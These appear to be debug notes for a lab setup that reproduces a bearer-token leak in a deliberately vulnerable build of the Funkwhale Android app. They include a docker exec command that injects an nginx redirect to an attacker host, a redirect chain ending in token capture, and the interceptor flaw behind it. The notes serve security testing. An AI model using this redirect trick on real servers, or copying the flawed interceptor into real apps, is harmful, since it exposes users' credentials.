# Funkwhale vuln_1 Debug Notes

## What Works

1. **Server setup** — Docker containers, healthchecks, HTTP on port 80 all working
2. **OAuth credential creation** — `apps.get_model('users', 'Application')` + `apps.get_model('users', 'AccessToken')` with `scope='read write'` on the Application
3. **AuthState JSON format** — Verified via bytecode decompilation of AppAuth v0.11.1. Correct keys are:
   - `mLastTokenResponse` (not `lastTokenResponse`)
   - `lastRegistrationResponse` (not `mLastRegistrationResponse`)
   - `redirect_uris` (not `redirectUris`) in RegistrationRequest
4. **SharedPreferences push** — Works, but **must fix SELinux context** by copying from the app's data directory (`chcon` with the app's context)
5. **App authentication** — `isAuthorized(): true` confirmed in logcat when SELinux is correct. App goes to MainActivity
6. **App makes API calls** — Albums, artists, favorites, playlists, radios all fetched
7. **Cover art API response** — Returns proper `urls.original` pointing to `/api/v1/attachments/<uuid>/proxy?next=original`
8. **Nginx redirect** — `/media/attachments/` → 302 to attacker works (tested manually)

## Current Blockers

### 1. `playable=true` filter returns 0 albums

The app queries with `playable=true` and gets nothing back. We created an upload record (`import_status='finished'`) for a track in album 41 but the `playable_by()` queryset filter still returns 0.

Root cause investigation:
- The agent user's actor (id=6) has no `fid` set (empty string)
- The library (id=4) privacy is set to `me` (changed to `everyone` but still 0)
- The `playable_by(actor)` method likely checks actor federation IDs and library access permissions
- May need to set `fid` on the agent's actor and properly configure library access

DB state:
```sql
-- Agent actor (id=6) has no fid
SELECT id, name, preferred_username, fid FROM federation_actor WHERE id = 6;
--  6 | (null) | agent | (empty)

-- Library 4 belongs to actor 6
SELECT id, actor_id, privacy_level FROM music_library WHERE id = 4;
--  4 | 6 | everyone
```

### 2. Nginx redirect needed for cross-domain token leak

The server's proxy endpoint (`/api/v1/attachments/<uuid>/proxy`) redirects to `/media/attachments/...` — still the **same domain** (10.0.2.2). The token only leaks if the redirect goes to an **external domain** (the attacker).

Solution: Add a second redirect in nginx:
```
/media/attachments/* → 302 → http://<HOST_IP>:8082/malicious.png
```

This was tested manually and works:
```bash
docker exec front sh -c "sed 's|location /media/ {|location /media/attachments/ {\n        return 302 http://<HOST_IP>:8082/malicious.png;\n    }\n\n    location /media/ {|' /etc/nginx/conf.d/default.conf > /tmp/test.conf && mv /tmp/test.conf /etc/nginx/conf.d/default.conf && nginx -t && nginx -s reload"
```

Needs to be added to `start_runtime.sh` dynamically after detecting HOST_IP.

### 3. SELinux context fix needed in start_runtime.sh

When pushing SharedPreferences via `adb push`, the file gets the wrong SELinux category. The app can't read it (EACCES).

Fix: After pushing, copy the SELinux context from the app's data directory:
```bash
SECONTEXT=$(adb shell ls -Z /data/data/audio.funkwhale.ffa/ | head -1 | awk '{print $1}')
adb shell chcon "$SECONTEXT" /data/data/audio.funkwhale.ffa/shared_prefs/credentials.xml
adb shell chcon "$SECONTEXT" /data/data/audio.funkwhale.ffa/shared_prefs/
```

## What Needs to Happen Next

1. **Fix playable albums** — Either fix the actor/library/fid setup so `playable_by` works, or find another way to make the app display albums with cover art. May need to investigate the `playable_by()` queryset method in Funkwhale's source.

2. **Add nginx redirect injection** to `start_runtime.sh` — After detecting HOST_IP, inject the `/media/attachments/` → attacker redirect into the running nginx config via `docker exec front`.

3. **Fix SELinux in start_runtime.sh** — Use `chcon` to copy context from app's data dir when pushing SharedPreferences.

## Full Redirect Chain (Goal)

```
App (OkHttp)
  → GET http://10.0.2.2/api/v1/attachments/<uuid>/proxy?next=original
  ← 302 Location: http://10.0.2.2/media/attachments/.../malicious.png  (Funkwhale API)
  → GET http://10.0.2.2/media/attachments/.../malicious.png
  ← 302 Location: http://<HOST_IP>:8082/malicious.png                  (nginx redirect)
  → GET http://<HOST_IP>:8082/malicious.png                             (EXTERNAL DOMAIN)
  ← Token captured!  (addNetworkInterceptor re-adds Bearer token on cross-domain redirect)
```

With `addInterceptor` (clean build): Token only added on first request (same domain), NOT on redirect hops → no leak.
With `addNetworkInterceptor` (vulnerable build): Token re-added on EVERY network call including the external redirect → leak!
